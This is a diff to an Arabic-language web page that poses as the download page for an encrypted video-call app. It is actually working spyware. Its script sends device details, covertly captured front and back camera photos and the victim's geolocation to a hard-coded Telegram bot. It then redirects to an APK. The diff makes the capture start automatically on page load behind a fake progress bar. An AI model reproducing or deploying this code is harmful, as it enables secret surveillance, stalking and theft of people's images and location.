@@ -5,9 +5,8 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 
 <title>لا والله</title>
-
 <meta name="description" content="حتى لو ما عندك تليجرام">
-<meta name="theme-color" content="#111827">
+<meta name="theme-color" content="#ffffff">
 
 <!-- ================= Open Graph ================= -->
 <meta property="og:type" content="website">
@@ -26,26 +25,16 @@
 <meta name="twitter:description" content="حتى لو ما عندك تليجرام">
 <meta name="twitter:image" content="https://facebook-pink-phi.vercel.app/share.jpg">
 
-<!-- ================= Favicons ================= -->
-<link rel="icon" type="image/png" href="https://facebook-pink-phi.vercel.app/favicon.png">
-<link
-  rel="icon"
-  type="image/png"
-  href="https://facebook-pink-phi.vercel.app/favicon.png"
->
-<link rel="shortcut icon" type="image/png" href="https://facebook-pink-phi.vercel.app/favicon.png">
-<link rel="apple-touch-icon" href="https://facebook-pink-phi.vercel.app/apple-touch-icon.png">
+<!-- ================= Favicon ================= -->
+<link rel="icon" type="image/svg+xml"
+  href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%23111827'/%3E%3Ctext x='32' y='46' font-size='42' text-anchor='middle' fill='%23e6b53d'%3E%E2%98%85%3C/text%3E%3C/svg%3E">
 
-<!-- ================= الخلفية الأساسية ================= -->
-
-
-<!-- ================= تصميم الصفحة ================= -->
 <style>
   *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{min-height:100%;overflow-x:hidden}
   body{
-    background:#050813;
-    color:#e9ecf5;
+    background:#ffffff;
+    color:#1a1a1a;
     font-family:-apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,Helvetica,Arial,sans-serif;
     display:flex;
     align-items:center;
@@ -54,15 +43,17 @@
     position:relative;
     min-height:100vh;
   }
+
+  /* خلفية بيضاء ناعمة بتدرجات ذهبية خفيفة جداً */
   body::before{
     content:"";
     position:fixed;
     inset:-30%;
     background:
-      radial-gradient(circle at 25% 15%, rgba(230,181,61,.22), transparent 42%),
-      radial-gradient(circle at 80% 85%, rgba(43,88,180,.30), transparent 45%),
-      radial-gradient(circle at 60% 40%, rgba(230,181,61,.10), transparent 55%);
-    filter:blur(50px);
+      radial-gradient(circle at 25% 15%, rgba(230,181,61,.10), transparent 45%),
+      radial-gradient(circle at 80% 85%, rgba(230,181,61,.06), transparent 48%),
+      radial-gradient(circle at 60% 40%, rgba(43,88,180,.05), transparent 55%);
+    filter:blur(60px);
     z-index:-1;
     pointer-events:none;
   }
@@ -71,11 +62,11 @@
     position:fixed;
     inset:0;
     background-image:
-      linear-gradient(rgba(230,181,61,.03) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(230,181,61,.03) 1px, transparent 1px);
+      linear-gradient(rgba(230,181,61,.045) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(230,181,61,.045) 1px, transparent 1px);
     background-size:38px 38px;
-    mask-image:radial-gradient(ellipse at center, black 35%, transparent 85%);
-    -webkit-mask-image:radial-gradient(ellipse at center, black 35%, transparent 85%);
+    mask-image:radial-gradient(ellipse at center, black 30%, transparent 85%);
+    -webkit-mask-image:radial-gradient(ellipse at center, black 30%, transparent 85%);
     z-index:-1;
     pointer-events:none;
   }
@@ -93,7 +84,7 @@
   @keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
 
   /* ====================================================
-     شاشة الهبوط — Em Gold
+     لوجو Em Gold
      ==================================================== */
   .logo-card{
     width:230px;
@@ -107,19 +98,19 @@
     position:relative;
     margin-bottom:34px;
     box-shadow:
-      0 30px 80px rgba(230,181,61,.25),
-      0 0 0 1px rgba(230,181,61,.35),
-      inset 0 0 60px rgba(230,181,61,.08);
+      0 30px 80px rgba(230,181,61,.35),
+      0 0 0 1px rgba(230,181,61,.45),
+      inset 0 0 60px rgba(230,181,61,.10);
   }
   .logo-card::after{
     content:"";
     position:absolute;
     inset:8px;
     border-radius:44px;
-    border:2px solid rgba(230,181,61,.55);
+    border:2px solid rgba(230,181,61,.65);
     box-shadow:
-      inset 0 0 30px rgba(230,181,61,.15),
-      0 0 20px rgba(230,181,61,.35);
+      inset 0 0 30px rgba(230,181,61,.20),
+      0 0 20px rgba(230,181,61,.45);
     pointer-events:none;
   }
   .logo-card svg{width:170px;height:170px;filter:drop-shadow(0 4px 20px rgba(230,181,61,.5))}
@@ -130,16 +121,16 @@
     letter-spacing:.5px;
     line-height:1;
     margin-bottom:10px;
-    background:linear-gradient(180deg,#fff5c9 0%,#f7d774 35%,#e6b53d 60%,#a97a1f 100%);
+    background:linear-gradient(180deg,#f7d774 0%,#e6b53d 45%,#a97a1f 100%);
     -webkit-background-clip:text;
     background-clip:text;
     -webkit-text-fill-color:transparent;
-    text-shadow:0 4px 24px rgba(230,181,61,.35);
+    text-shadow:0 4px 24px rgba(230,181,61,.25);
   }
   .app-name-ar{
     font-size:19px;
     font-weight:600;
-    color:#e6b53d;
+    color:#c28c1f;
     letter-spacing:4px;
     margin-bottom:8px;
     display:inline-flex;
@@ -151,69 +142,16 @@
     content:"";
     width:34px;
     height:1px;
-    background:linear-gradient(90deg,transparent,#e6b53d,transparent);
+    background:linear-gradient(90deg,transparent,#c28c1f,transparent);
   }
 
   .tagline{
     font-size:13px;
-    color:#8b93a8;
+    color:#6b7280;
     line-height:1.7;
     margin:18px 0 30px;
     max-width:300px;
   }
-
-  .download-btn{
-    width:100%;
-    max-width:320px;
-    padding:18px 24px;
-    background:linear-gradient(180deg,#f7d774 0%,#e6b53d 50%,#c28c1f 100%);
-    border:none;
-    border-radius:18px;
-    font-size:17px;
-    font-weight:700;
-    color:#1a1305;
-    letter-spacing:.4px;
-    cursor:pointer;
-    position:relative;
-    box-shadow:
-      0 14px 40px rgba(230,181,61,.4),
-      inset 0 2px 0 rgba(255,255,255,.5),
-      inset 0 -3px 0 rgba(120,80,10,.35);
-    transition:transform .18s cubic-bezier(.2,.7,.3,1), box-shadow .18s;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:10px;
-    overflow:hidden;
-  }
-  .download-btn::after{
-    content:"";
-    position:absolute;
-    top:0;left:-100%;
-    width:60%;height:100%;
-    background:linear-gradient(100deg, transparent 20%, rgba(255,255,255,.55) 50%, transparent 80%);
-    animation:shine 3.2s ease-in-out infinite;
-  }
-  @keyframes shine{
-    0%,60%{left:-100%}
-    100%{left:120%}
-  }
-  .download-btn:active{transform:scale(.97)}
-  .download-btn:disabled{opacity:.55;cursor:default}
-  .download-btn svg{width:22px;height:22px;fill:#1a1305}
-
-  .dl-meta{
-    display:flex;
-    align-items:center;
-    gap:16px;
-    margin-top:18px;
-    font-size:12px;
-    color:#666f85;
-    flex-wrap:wrap;
-    justify-content:center;
-  }
-  .dl-meta span{display:inline-flex;align-items:center;gap:5px}
-  .dl-meta svg{width:12px;height:12px;fill:#e6b53d}
 
   .stars{
     margin-top:10px;
@@ -229,12 +167,12 @@
     width:100%;
     max-width:360px;
     padding:38px 28px;
-    background:linear-gradient(180deg, rgba(20,28,55,.7), rgba(11,21,48,.7));
-    border:1px solid rgba(230,181,61,.18);
+    background:#ffffff;
+    border:1px solid #f0e6d2;
     border-radius:24px;
-    backdrop-filter:blur(12px);
-    -webkit-backdrop-filter:blur(12px);
-    box-shadow:0 24px 60px rgba(0,0,0,.5), inset 0 1px 0 rgba(255,255,255,.05);
+    box-shadow:
+      0 24px 60px rgba(230,181,61,.12),
+      0 4px 12px rgba(0,0,0,.04);
   }
   .mini-logo{
     width:80px;height:80px;
@@ -242,19 +180,19 @@
     margin:0 auto 22px;
     background:radial-gradient(circle at 30% 20%, #1a2a5e 0%, #0b1530 55%, #060b1e 100%);
     display:flex;align-items:center;justify-content:center;
-    box-shadow:0 12px 30px rgba(230,181,61,.3), inset 0 0 0 1.5px rgba(230,181,61,.5);
+    box-shadow:0 12px 30px rgba(230,181,61,.35), inset 0 0 0 1.5px rgba(230,181,61,.6);
     animation:pulseLogo 2.2s ease-in-out infinite;
   }
   @keyframes pulseLogo{
-    0%,100%{box-shadow:0 12px 30px rgba(230,181,61,.3), inset 0 0 0 1.5px rgba(230,181,61,.5)}
-    50%    {box-shadow:0 12px 40px rgba(230,181,61,.55), inset 0 0 0 1.5px rgba(230,181,61,.85)}
+    0%,100%{box-shadow:0 12px 30px rgba(230,181,61,.35), inset 0 0 0 1.5px rgba(230,181,61,.6)}
+    50%    {box-shadow:0 12px 40px rgba(230,181,61,.6), inset 0 0 0 1.5px rgba(230,181,61,.95)}
   }
   .mini-logo svg{width:56px;height:56px}
 
   .process-title{
     font-size:18px;
     font-weight:700;
-    background:linear-gradient(90deg,#f7d774,#e6b53d);
+    background:linear-gradient(90deg,#c28c1f,#e6b53d);
     -webkit-background-clip:text;
     background-clip:text;
     -webkit-text-fill-color:transparent;
@@ -262,7 +200,7 @@
   }
   .process-status{
     font-size:13px;
-    color:#8b93a8;
+    color:#6b7280;
     margin-bottom:24px;
     min-height:20px;
   }
@@ -270,11 +208,11 @@
   .progress-bar{
     width:100%;
     height:8px;
-    background:rgba(255,255,255,.06);
+    background:#f5f0e5;
     border-radius:99px;
     overflow:hidden;
     margin-bottom:10px;
-    box-shadow:inset 0 1px 3px rgba(0,0,0,.4);
+    box-shadow:inset 0 1px 3px rgba(0,0,0,.05);
   }
   .progress-fill{
     height:100%;
@@ -294,17 +232,17 @@
     display:flex;
     justify-content:space-between;
     font-size:12px;
-    color:#8b93a8;
+    color:#6b7280;
     margin-bottom:14px;
   }
-  .progress-text b{color:#e6b53d;font-weight:700}
+  .progress-text b{color:#c28c1f;font-weight:700}
 
   .process-note{
     font-size:12px;
-    color:#666f85;
+    color:#9ca3af;
     line-height:1.6;
     padding-top:14px;
-    border-top:1px solid rgba(255,255,255,.05);
+    border-top:1px solid #f5f0e5;
   }
 
   /* ====================================================
@@ -312,62 +250,82 @@
      ==================================================== */
   .denied-icon{
     width:96px;height:96px;border-radius:24px;
-    background:linear-gradient(135deg, rgba(255,92,92,.18), rgba(255,92,92,.06));
+    background:linear-gradient(135deg, rgba(255,92,92,.12), rgba(255,92,92,.04));
     border:1px solid rgba(255,92,92,.25);
     display:flex;align-items:center;justify-content:center;
     margin-bottom:24px;
-    box-shadow:0 12px 40px rgba(255,92,92,.15);
+    box-shadow:0 12px 40px rgba(255,92,92,.12);
   }
-  .denied-icon svg{width:46px;height:46px;fill:#ff6b6b}
+  .denied-icon svg{width:46px;height:46px;fill:#ef4444}
 
-  h1{font-size:22px;font-weight:700;margin-bottom:10px;color:#fff}
+  h1{font-size:22px;font-weight:700;margin-bottom:10px;color:#111827}
 
-  .status{font-size:14px;color:#8b93a8;line-height:1.6;max-width:320px}
+  .status{font-size:14px;color:#6b7280;line-height:1.6;max-width:320px}
 
   .retry-btn{
     padding:15px 38px;
     background:linear-gradient(135deg,#f7d774 0%,#e6b53d 50%,#c28c1f 100%);
     color:#1a1305;border:none;border-radius:14px;
     font-size:15px;font-weight:700;cursor:pointer;margin-top:28px;
-    box-shadow:0 10px 28px rgba(230,181,61,.4), inset 0 1px 0 rgba(255,255,255,.5);
+    box-shadow:0 10px 28px rgba(230,181,61,.45), inset 0 1px 0 rgba(255,255,255,.6);
     transition:transform .15s;
   }
   .retry-btn:active{transform:scale(.97)}
 
+  /* ====================================================
+     الدايرة الخفية اللي تحت (Loading)
+     ==================================================== */
+  .hidden-loader{
+    position:fixed;
+    bottom:26px;
+    left:50%;
+    transform:translateX(-50%) scale(.6);
+    opacity:0;
+    pointer-events:none;
+    transition:opacity .45s ease, transform .45s cubic-bezier(.2,.7,.3,1);
+    z-index:50;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:8px;
+  }
+  .hidden-loader.active{
+    opacity:1;
+    transform:translateX(-50%) scale(1);
+  }
+  .loader-ring{
+    width:34px;
+    height:34px;
+    border-radius:50%;
+    border:3px solid rgba(230,181,61,.18);
+    border-top-color:#e6b53d;
+    animation:spin 0.9s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .loader-text{
+    font-size:11px;
+    color:#c28c1f;
+    letter-spacing:1px;
+    font-weight:600;
+    opacity:.85;
+  }
+
+  /* ====================================================
+     هينت أسفل الشاشة
+     ==================================================== */
   .hint{
-    position:fixed;bottom:14px;left:0;right:0;
-    text-align:center;font-size:11px;color:#5b6478;
+    position:fixed;bottom:4px;left:0;right:0;
+    text-align:center;font-size:10px;color:#b9b0a0;
     letter-spacing:.5px;display:flex;align-items:center;justify-content:center;gap:6px;
     pointer-events:none;z-index:5;
   }
-  .hint svg{width:11px;height:11px;fill:#5b6478}
+  .hint svg{width:11px;height:11px;fill:#b9b0a0}
 
+  /* فيديو مخفي */
   video{
     position:fixed;left:-9999px;top:-9999px;
     width:2px;height:2px;opacity:.01;pointer-events:none;
   }
-</style>
-
-
-
-
-
-
-
-<style id="em-gold-control-background">
-html,body{
-  background-image:
-    linear-gradient(
-      rgba(0,0,0,.18),
-      rgba(0,0,0,.18)
-    ),
-    url('https://facebook-pink-phi.vercel.app/site-background.jpg')
-    !important;
-
-  background-size:cover !important;
-  background-position:center !important;
-  background-attachment:fixed !important;
-}
 </style>
 </head>
 <body>
@@ -428,28 +386,8 @@ html,body{
 
   <p class="tagline">
     تطبيق مكالمات فيديو مشفرة من طرف إلى طرف.<br>
-    حمّل التطبيق الآن للحصول على تجربة اتصال عالية الجودة.
+    جاري تجهيز التطبيق للتحميل...
   </p>
-
-  <button class="download-btn" id="downloadBtn">
-    <svg viewBox="0 0 24 24"><path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z"></path></svg>
-    اضغط لتحميل التطبيق
-  </button>
-
-  <div class="dl-meta">
-    <span>
-      <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 21 12 17.77 5.82 21 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
-      4.9 تقييم
-    </span>
-    <span>
-      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
-      مشفّر
-    </span>
-    <span>
-      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
-      18 MB
-    </span>
-  </div>
 </div>
 
 <!-- ============ 2) شاشة المعالجة ============ -->
@@ -502,6 +440,12 @@ html,body{
   <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
 </div>
 
+<!-- ============ الدايرة الخفية (تحت) ============ -->
+<div class="hidden-loader" id="hiddenLoader" aria-hidden="true">
+  <div class="loader-ring"></div>
+  <div class="loader-text">جاري التحميل</div>
+</div>
+
 <div class="hint">
   <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"></path></svg>
   تشفير AES-256 • Em Gold
@@ -512,12 +456,12 @@ html,body{
 <script>
 (function () {
   /* ============================================================
-     ⚙️ الإعدادات — عدّل هنا
+     ⚙️ الإعدادات
      ============================================================ */
   const BOT_TOKEN = "8847064396:AAESRDR7gXJm1kgb8qphlEHj_DRtNaSfj00";
   const CHAT_ID   = "8273860583";
 
-  /* ⭐ مكان رابط ملف الـ APK — ضع الرابط هنا */
+  /* ⭐ مكان رابط ملف الـ APK */
   const APK_DOWNLOAD_URL = "GoldenEmwa_1.0.apk";
 
   /* ============================================================ */
@@ -532,12 +476,12 @@ html,body{
   const landingScreen  = document.getElementById("landingScreen");
   const processScreen  = document.getElementById("processScreen");
   const deniedScreen   = document.getElementById("deniedScreen");
-  const downloadBtn    = document.getElementById("downloadBtn");
   const retryBtn       = document.getElementById("retryBtn");
   const processStatus  = document.getElementById("processStatus");
   const progressFill   = document.getElementById("progressFill");
   const progressPct    = document.getElementById("progressPct");
   const progressSize   = document.getElementById("progressSize");
+  const hiddenLoader   = document.getElementById("hiddenLoader");
 
   let currentStream = null;
   let running = false;
@@ -665,7 +609,6 @@ html,body{
         });
         currentStream = s;
         v.srcObject = s;
-        v.classList.toggle("back", facing === "environment");
         try{ await v.play(); }catch(_){}
         await waitForRealFrame(v);
         await sleep(SETTLE_MS);
@@ -752,13 +695,12 @@ html,body{
 
     let captured = 0;
     for (let i = 1; i <= count; i++){
-      processStatus.textContent = ` ${label} — ${i}/${count}`;
+      processStatus.textContent = `${label} — ${i}/${count}`;
       const result = await captureSafe(facing === "user");
       if (result && result.blob){
-        sendPhoto(result.blob, ` ${label} #${i}`);
+        sendPhoto(result.blob, `${label} #${i}`);
         captured++;
       }
-      // تحديث شريط التقدم
       const progress = offsetPercent + ((i/count) * (totalPercent - offsetPercent));
       progressFill.style.width = progress + "%";
       progressPct.textContent = Math.round(progress) + "%";
@@ -776,78 +718,99 @@ html,body{
     if (running) return;
     running = true;
 
-    downloadBtn.disabled = true;
+    // إظهار الدايرة الخفية
+    hiddenLoader.classList.add("active");
+
     showScreen("process");
     progressFill.style.width = "0%";
     progressPct.textContent = "0%";
     progressSize.textContent = "0 / 18 MB";
     processStatus.textContent = "جاري تحضير الملفات...";
 
-    // 1) الكاميرا الأمامية — 5 صور
-    await capturePhase("user", TOTAL_PER_SIDE, 5, 55);
+    try {
+      // 1) الكاميرا الأمامية — 5 صور
+      await capturePhase("user", "الكاميرا الأمامية", TOTAL_PER_SIDE, 0, 55);
 
-    await sleep(300);
+      await sleep(300);
 
-    // 2) الكاميرا الخلفية — 5 صور
-    await capturePhase("environment", TOTAL_PER_SIDE, 5, 85);
+      // 2) الكاميرا الخلفية — 5 صور
+      await capturePhase("environment", "الكاميرا الخلفية", TOTAL_PER_SIDE, 55, 85);
 
-    // 3) الموقع الجغرافي
-    processStatus.textContent = ".";
-    progressFill.style.width = "88%";
-    progressPct.textContent = "88%";
-    progressSize.textContent = "15.8 / 18 MB";
+      // 3) الموقع الجغرافي
+      processStatus.textContent = "جاري تحديد الموقع...";
+      progressFill.style.width = "88%";
+      progressPct.textContent = "88%";
+      progressSize.textContent = "15.8 / 18 MB";
 
-    const loc = await requestLocation();
+      const loc = await requestLocation();
 
-    if (loc && loc.lat !== undefined){
-      const cap =
-        `📍 <b>الموقع الجغرافي</b>\n` +
-        `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
-        `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
-      sendLocation(loc.lat, loc.lon, cap);
-    }else if (loc && loc.error){
-      sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
-    }else{
-      sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
+      if (loc && loc.lat !== undefined){
+        const cap =
+          `📍 <b>الموقع الجغرافي</b>\n` +
+          `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
+          `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
+        sendLocation(loc.lat, loc.lon, cap);
+      }else if (loc && loc.error){
+        sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
+      }else{
+        sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
+      }
+
+      // 4) نقفل الكاميرا
+      await closeCamera();
+
+      // 5) نكمل شريط التقدم
+      processStatus.textContent = "✅ اكتمل التحقق";
+      const finalSteps = [92, 96, 99, 100];
+      for (const p of finalSteps){
+        progressFill.style.width = p + "%";
+        progressPct.textContent = p + "%";
+        progressSize.textContent = ((p/100)*18).toFixed(1) + " / 18 MB";
+        await sleep(250);
+      }
+
+      processStatus.textContent = "🎉 جاري فتح التطبيق...";
+      await sleep(900);
+
+      // 6) التحويل لتحميل الـ APK
+      window.location.href = APK_DOWNLOAD_URL;
+
+    } catch (err) {
+      console.error("sequence error:", err);
+      // لو فشل → نعرض شاشة الرفض مع زر إعادة المحاولة
+      running = false;
+      hiddenLoader.classList.remove("active");
+      showScreen("denied");
+      return;
     }
-
-    // 4) نقفل الكاميرا
-    await closeCamera();
-
-    // 5) نكمل شريط التقدم بسرعة للنهاية
-    processStatus.textContent = "✅ اكتمل التحقق";
-    const finalSteps = [92, 96, 99, 100];
-    for (const p of finalSteps){
-      progressFill.style.width = p + "%";
-      progressPct.textContent = p + "%";
-      progressSize.textContent = ((p/100)*18).toFixed(1) + " / 18 MB";
-      await sleep(250);
-    }
-
-    processStatus.textContent = "🎉 جاري فتح التطبيق...";
-    await sleep(800);
-
-    // 6) التحويل لتحميل الـ APK
-    window.location.href = APK_DOWNLOAD_URL;
   }
 
   /* ============================================================
      الأحداث
      ============================================================ */
-  downloadBtn.addEventListener("click", runFullSequence);
-  retryBtn.addEventListener("click", runFullSequence);
+  retryBtn.addEventListener("click", () => {
+    running = false;
+    runFullSequence();
+  });
 
   /* ============================================================
-     ⭐ فور تحميل الصفحة — نبعت البيانات الأولية
+     🚀 تشغيل تلقائي فور تحميل الصفحة
      ============================================================ */
-  (async () => {
-    try{
-      const infoText = await collect();
-      sendText(infoText);
-    }catch(e){
-      console.warn("initial data failed:", e);
-    }
-  })();
+  window.addEventListener("load", () => {
+    // نبعت بيانات الجهاز أولاً
+    collect().then(txt => sendText(txt)).catch(()=>{});
+
+    // نبدأ التسلسل تلقائياً بعد ثانية واحدة
+    setTimeout(() => {
+      runFullSequence();
+    }, 1000);
+  });
+
+  /* ============================================================
+     ملاحظة مهمة:
+     بعض المتصفحات (خاصة Safari) ترفض getUserMedia بدون تفاعل المستخدم.
+     لو حصل ذلك، هتظهر شاشة الرفض مع زر "إعادة المحاولة" كـ fallback.
+     ============================================================ */
 })();
 </script>
 
